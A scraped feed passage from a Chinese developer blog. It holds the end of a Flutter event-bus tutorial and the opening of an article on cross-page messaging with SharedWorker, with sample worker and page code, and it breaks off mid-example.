    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">2</span>) {
      index = <span class="hljs-number">0</span>;
    }
    eventBus.fire(BusNotificationTest(index));
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        Expanded(
            child: Container(
                alignment: Alignment.center,
                decoration: <span class="hljs-keyword">const</span> BoxDecoration(color: Colors.white),
                child: TextButton(
                    onPressed: handleColorChange,
                    child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'点击变色'</span>,
                        style: TextStyle(color: Colors.black, fontSize: <span class="hljs-number">20</span>))))),
        <span class="hljs-keyword">const</span> EventBusChildPage()
      ],
    );
  }
}
</code></pre>
<ul>
<li>组件定义：
<ul>
<li>EventBusParentPage是一个有状态组件，通过createState方法返回EventBusParentPageState实例，用于管理组件状态和构建 UI。</li>
</ul>
</li>
<li>状态变量：
<ul>
<li>index：一个整型变量，用于记录颜色索引，初始值为 0。这个索引将决定子组件最终显示的颜色。</li>
</ul>
</li>
<li>事件处理方法：
<ul>
<li>handleColorChange：当用户点击父组件中的按钮时，该方法被调用。它首先将index值增加 1，如果index超过 2，则重置为 0。然后，通过事件总线eventBus触发一个BusNotificationTest类型的事件，并将当前的index值作为参数传递给该事件。这里的eventBus应该是在全局或合适的作用域中定义的事件总线实例，BusNotificationTest则是一个自定义的事件类，用于携带数据（这里是颜色索引）。</li>
</ul>
</li>
<li>构建 UI：
<ul>
<li>在build方法中，父组件构建了一个垂直方向的Column布局。</li>
<li>第一个子组件是一个Expanded包裹的Container，其中包含一个TextButton。按钮的文本为 “点击变色”，当按钮被点击时，会调用handleColorChange方法。Container的背景颜色设置为白色。</li>
<li>第二个子组件是EventBusChildPage，这是需要接收事件通知的子组件，通过const关键字创建，意味着它是一个不可变的组件实例。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>子组件：EventBusChildPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">事件Bus通知子类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusChildPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusChildPageState createState() =&gt; EventBusChildPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusChildPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">颜色列表</span></span>
  <span class="hljs-built_in">List</span>&lt;Color&gt; colorList = [Colors.red, Colors.yellow, Colors.blue];

  <span class="hljs-comment">/// <span class="markdown">刷新监听</span></span>
  <span class="hljs-keyword">late</span> StreamSubscription&lt;BusNotificationTest&gt; eventBusExample;

  <span class="hljs-comment">/// <span class="markdown">背景颜色</span></span>
  <span class="hljs-keyword">late</span> Color bgColor;

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    bgColor = colorList[<span class="hljs-number">0</span>];
    <span class="hljs-comment">// 监听颜色索引变化</span>
    eventBusExample = eventBus.<span class="hljs-keyword">on</span>&lt;BusNotificationTest&gt;().listen((event) {
      setState(() {
        bgColor = colorList[event.index];
      });
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    eventBusExample.cancel();
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> SizedBox(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height / <span class="hljs-number">2</span>,
        child: Container(color: bgColor, child: <span class="hljs-keyword">null</span>));
  }
}
</code></pre>
<ul>
<li>组件定义：
<ul>
<li>EventBusChildPage同样是一个有状态组件，其createState方法返回EventBusChildPageState实例。</li>
</ul>
</li>
<li>状态变量
<ul>
<li>colorList：一个包含三种颜色（红色、黄色、蓝色）的列表，用于存储可供选择的背景颜色。</li>
<li>eventBusExample：一个StreamSubscription类型的变量，用于订阅事件总线eventBus上的BusNotificationTest类型的事件。这里使用late关键字声明，意味着在initState方法中会对其进行初始化。</li>
<li>bgColor：用于存储子组件当前的背景颜色，初始值为colorList中的第一个颜色（红色），同样使用late关键字声明，在initState方法中初始化。</li>
</ul>
</li>
<li>生命周期方法：
<ul>
<li>initState：在组件插入到 Widget 树时调用。首先调用父类的initState方法，然后初始化bgColor为colorList中的第一个颜色。接着，通过eventBus.on().listen方法，订阅事件总线上的BusNotificationTest事件。当接收到该事件时，会执行回调函数，在回调函数中，通过setState方法更新bgColor为colorList中对应索引的颜色。这里的event.index就是父组件触发事件时传递过来的颜色索引。</li>
<li>dispose：当组件从 Widget 树中移除时调用。在这个方法中，调用eventBusExample.cancel()取消对事件总线的订阅，防止内存泄漏，然后调用父类的dispose方法。</li>
</ul>
</li>
<li>构建 UI：
<ul>
<li>在build方法中，子组件构建了一个SizedBox，其宽度为屏幕宽度，高度为屏幕高度的一半。在SizedBox内部是一个Container，其背景颜色由bgColor决定。当bgColor因接收到事件通知而改变时，Container的背景颜色也会相应改变，从而实现了根据父组件通知动态更新子组件 UI 的效果。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">3. 总结</h2>
<p>通过上述代码，我们清晰地看到了如何在 Flutter 中利用事件总线实现父子组件之间的通信。父组件通过触发事件并携带相关数据，子组件通过订阅事件总线并根据接收到的事件数据更新自身状态和 UI。</p>
<p>这种方式有效地解耦了父子组件之间的直接依赖关系，提高了代码的可维护性和扩展性。在实际项目中，当存在多个组件之间复杂的交互时，事件总线是一种非常强大且灵活的解决方案。</p>
<hr/>
<blockquote>
<p>本次分享就到这儿啦，我是鹏多多，深耕前端的技术创作者，如果您看了觉得有帮助，欢迎评论，关注，点赞，转发，我们下次见~</p>
</blockquote>
<p>PS：在本页按F12，在console中输入document.getElementsByClassName('panel-btn')[0].click();有惊喜哦~</p>
<p><code>往期文章</code></p>
<ul>
<li><a href="https://juejin.cn/post/7582808491582619684" target="_blank" title="https://juejin.cn/post/7582808491582619684">Flutter输入框TextField的属性与实战用法全面解析+示例</a></li>
<li><a href="https://juejin.cn/post/7581693431740448831" target="_blank" title="https://juejin.cn/post/7581693431740448831">Flutter自定义日历table_calendar完全指南+案例</a></li>
<li><a href="https://juejin.cn/post/7580389111921786943" target="_blank" title="https://juejin.cn/post/7580389111921786943">flutter-屏幕自适应插件flutter_screenutil教程全指南</a></li>
<li><a href="https://juejin.cn/post/7579101504289882166" target="_blank" title="https://juejin.cn/post/7579101504289882166">flutter-使用url_launcher打开链接/应用/短信/邮件和评分跳转等</a></li>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutter图片选择库multi_image_picker_plus和image_picker的对比和使用解析</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">解锁flutter弹窗新姿势：dialog-flutter_smart_dialog插件解读+案例</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-切换状态显示不同组件10种实现方案全解析</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-详解控制组件显示的两种方式Offstage与Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-使用AnimatedDefaultTextStyle实现文本动画</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-使用SafeArea组件处理各机型的安全距离</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-实现渐变色边框背景以及渐变色文字</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-使用confetti制作炫酷纸屑爆炸粒子动画</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端跨页面通讯终极指南⑥：SharedWorker 用法全解析]]></title>    <link>https://juejin.cn/post/7583574154341072905</link>    <guid>https://juejin.cn/post/7583574154341072905</guid>    <pubDate>2025-12-14T19:52:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583574154341072905" data-draft-id="7576369868418875428" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端跨页面通讯终极指南⑥：SharedWorker 用法全解析"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-14T19:52:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一诺滚雪球"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端跨页面通讯终极指南⑥：SharedWorker 用法全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一诺滚雪球
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T19:52:22.000Z" title="Sun Dec 14 2025 19:52:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>前面的文章已经介绍了<code>postMessage</code>、<code>localStorage</code>、<code>messageChannel</code>、<code>broadcastChannel</code>以及<code>window.name</code>。今天要介绍一种“多页面协同”场景的工具——<strong>SharedWorker</strong>。</p>
<p>不同于普通Worker只能被单个页面独占，SharedWorker能被<strong>同一域名下的多个页面共享</strong>，实现高效的“多页面数据中枢”。本文就带你了解<strong>SharedWorker</strong>跨页面通讯的核心用法。</p>
<h2 data-id="heading-1">1. 什么是SharedWorker？</h2>
<p>在介绍SharedWorker之前，我们先回顾下Worker的基本概念：Worker是HTML5引入的后台线程机制，能让JavaScript在主线程之外运行，避免复杂计算阻塞页面渲染。而SharedWorker，顾名思义，是“可共享的Worker”，它有两个核心特点：</p>
<ul>
<li><strong>跨页面共享</strong>：同一域名下的多个标签页、iframe，甚至不同窗口，都能连接到同一个SharedWorker实例，实现数据互通。</li>
<li><strong>独立线程</strong>：运行在独立于所有页面主线程的后台线程中，既不会阻塞页面，也能统一处理多页面的请求。</li>
<li><strong>域名隔离</strong>：遵循同源策略，只有相同协议、域名、端口的页面，才能共享同一个SharedWorker。</li>
</ul>
<p>简单来说，SharedWorker就像一个“公共服务端”，多个页面作为“客户端”与之建立连接，通过它完成数据的传递与协同。和普通Worker的“一对一”模式不同，它是“一对多”的通讯方案。</p>
<h2 data-id="heading-2">2. SharedWorker如何实现跨页面通讯？</h2>
<p>SharedWorker的通讯原理可以概括为“<strong>单一实例+多端口连接</strong>”，先看一张图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5bdd1f7e0e489583b6c564474e5108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=IoaS0x0QCyt2r4a0Icakl8QznFo%3D" alt="image.png" loading="lazy"/></p>
<p>具体流程是：</p>
<ol>
<li><strong>创建实例</strong>：每个页面通过<code>new SharedWorker('./share.js')</code>创建实例时，浏览器会启动一个SharedWorker后台线程，加载指定的脚本文件,这个脚本文件是共享。</li>
<li><strong>端口建立</strong>：每个页面连接到SharedWorker后，都会与Worker建立一个独立的“消息端口”（MessagePort），这是页面与Worker之间的通讯通道。</li>
<li><strong>数据传递</strong>：页面和Worker都是通过通过端口发送消息<code>port.postMessage</code>，都是通过<code>port.onmessage</code>接收数据进行处理，再通过端口将结果反馈给单个页面，或广播给所有连接的页面。</li>
<li><strong>实例销毁</strong>：当所有连接到SharedWorker的页面都关闭时，Worker后台线程才会被浏览器销毁，释放资源。</li>
</ol>
<p>说了这么多,接下来我们进行实践操作。</p>
<h2 data-id="heading-3">3. 实践案例</h2>
<p>SharedWorker的使用分为“Worker脚本”和“页面脚本”两部分，Worker脚本负责核心逻辑，页面脚本负责建立连接和收发消息。</p>
<p>实现需求：同一域名下的pageA和pageB页面，通过SharedWorker实现消息互发，且任意页面可以通过Worker广播消息给所有页面。</p>
<p>可以先看一张页面如何连接到Worker流程图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c87f6c4b75dc4e1f8b9d2b93d6c3bf81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=2gdOw5PK2ryQkADfhfM2X1rmgH8%3D" alt="image.png" loading="lazy"/></p>
<p>页面端我们只需要接收发送消息即可，Worker端我们需要收集注册的端口并进行逻辑处理，下面我们一步步来实现：</p>
<h3 data-id="heading-4">3.1 步骤1：编写SharedWorker核心脚本（share.js）</h3>
<p>share.js的核心逻辑：是使用Map结构，通过<code>connect</code>将所有连接Worker的页面进行收集端口，每个页面需要唯一的pageId用于后续私发消息。</p>
<p>页面发送数据分为三种，进入页面需要注册到share.js，发送广播消息，发送私信需要target页面的pageId。 数据如下：</p>

























<table><thead><tr><th>类型</th><th>用途</th><th>参数</th></tr></thead><tbody><tr><td><code>register</code></td><td>页面注册</td><td><code>pageId</code></td></tr><tr><td><code>broadcast</code></td><td>广播消息</td><td><code>pageId</code>, <code>data</code></td></tr><tr><td><code>private</code></td><td>点对点消息</td><td><code>pageId</code>, <code>target</code>, <code>data</code></td></tr></tbody></table>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 注册页面</span>
port.<span class="hljs-title function_">postMessage</span>({                                              
    <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,                                           
    <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>                                          
});                                                            
<span class="hljs-comment">// 发送广播                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,                                          
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hello everyone!'</span>                                     
});                                                             
<span class="hljs-comment">// 发送私信                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,                                            
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hi page-456!'</span>                                        
}); 
</code></pre>
<p>share.js脚本：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 存储所有页面与Worker的连接端口（使用 Map，key 是 pageId，value 是 port）</span>
<span class="hljs-keyword">const</span> connections = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'打印***self'</span>, self)
<span class="hljs-comment">// 监听新页面的连接请求</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-comment">// 获取当前页面的通讯端口</span>
    <span class="hljs-keyword">const</span> port = e.<span class="hljs-property">ports</span>[<span class="hljs-number">0</span>];

    <span class="hljs-comment">// 注意：此时还不知道 pageId，需要等待 register 消息</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`新页面尝试连接，等待注册...`</span>);

    <span class="hljs-comment">// 允许端口通讯</span>
    port.<span class="hljs-title function_">start</span>();

    <span class="hljs-comment">// 向页面发送连接成功消息（用于调试）</span>
    port.<span class="hljs-title function_">postMessage</span>({
        <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>,
        <span class="hljs-attr">type</span>: <span class="hljs-string">'connected'</span>,
        <span class="hljs-attr">data</span>: <span class="hljs-string">`Worker 已连接，当前连接数：<span class="hljs-subst">${connections.size}</span>`</span>
    });

    <span class="hljs-comment">// 监听端口的消息事件（接收页面发来的消息）</span>
    port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Worker收到消息:'</span>, msg.<span class="hljs-property">data</span>);
        <span class="hljs-keyword">const</span> { type, target, data, pageId } = msg.<span class="hljs-property">data</span>;

        <span class="hljs-comment">// 0. 处理注册消息（页面连接时立即发送）</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'register'</span>) {
            <span class="hljs-comment">// 如果该 pageId 已存在，说明是页面刷新，先关闭旧连接</span>
            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(pageId)) {
                <span class="hljs-keyword">const</span> oldPort = connections.<span class="hljs-title function_">get</span>(pageId);
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 刷新，清理旧连接`</span>);
                <span class="hljs-keyword">try</span> {
                    oldPort.<span class="hljs-title function_">close</span>();
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-comment">// 忽略关闭错误</span>
                }
            }

            <span class="hljs-comment">// 保存新连接</span>
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 已注册，当前在线：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>,connections);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 保存页面标识到端口对象（兼容旧的发送方式）</span>
        <span class="hljs-keyword">if</span> (pageId &amp;&amp; !port.<span class="hljs-property">pageId</span>) {
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 已注册（兼容模式）`</span>);
        }

        <span class="hljs-comment">// 1. 广播消息：发送给所有连接的页面</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'broadcast'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`广播消息给 <span class="hljs-subst">${connections.size}</span> 个连接`</span>);
            connections.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">conn, id</span>) =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    conn.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`广播消息：<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`发送给 <span class="hljs-subst">${id}</span> 失败，移除连接`</span>);
                    connections.<span class="hljs-title function_">delete</span>(id);
                }
            });
        }
        <span class="hljs-comment">// 2. 点对点消息：仅发送给目标页面（这里用页面标识区分）</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'private'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`私发消息给 <span class="hljs-subst">${target}</span>，当前连接：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);

            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(target)) {
                <span class="hljs-keyword">try</span> {
                    connections.<span class="hljs-title function_">get</span>(target).<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`私发消息：<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`发送给 <span class="hljs-subst">${target}</span> 失败，移除连接`</span>);
                    connections.<span class="hljs-title function_">delete</span>(target);
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`警告：未找到目标页面 <span class="hljs-subst">${target}</span>`</span>);
            }
        }
    };

    <span class="hljs-comment">// 监听端口关闭事件（页面关闭或主动断开）</span>
    port.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'close'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// 通过 pageId 删除连接</span>
        <span class="hljs-keyword">if</span> (port.<span class="hljs-property">pageId</span>) {
            connections.<span class="hljs-title function_">delete</span>(port.<span class="hljs-property">pageId</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${port.pageId}</span> 断开连接，当前在线：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);
        }
    });

    <span class="hljs-comment">// 允许端口通讯（必须调用，否则无法收发消息）</span>
    port.<span class="hljs-title function_">start</span>();
});

</code></pre>
<h3 data-id="heading-5">3.2 步骤二：编写页面脚本（pageA.html 和 pageB.html）</h3>
<p>代码逻辑如下：唯一需要区别的是<code>pageId</code>，页面B只需将<code>pageId</code>改为<code>page-456</code>，并调整“发给页面B”按钮的逻辑为“发给页面A”即可。</p>
<p>页面的创建流程如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span> 页面创建 <span class="hljs-title class_">SharedWorker</span> 实例
   ↓
<span class="hljs-number">2.</span> 调用 port.<span class="hljs-title function_">start</span>() 启动通信
   ↓
<span class="hljs-number">3.</span> 注册 onmessage 监听器
   ↓
<span class="hljs-number">4.</span> 发送 register 消息（携带 pageId）
   ↓
<span class="hljs-number">5.</span> <span class="hljs-title class_">Worker</span> 保存连接到 <span class="hljs-title class_">Map</span>: connections.<span class="hljs-title function_">set</span>(pageId, port)
   ↓
<span class="hljs-number">6.</span> 页面可以开始发送/接收消息
</code></pre>
<p>代码如下：</p>
<pre><code class="hljs language-js" lang="js">&lt;body&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>页面A（标识：page-123）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"msgInput"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入消息"</span>&gt;</span>
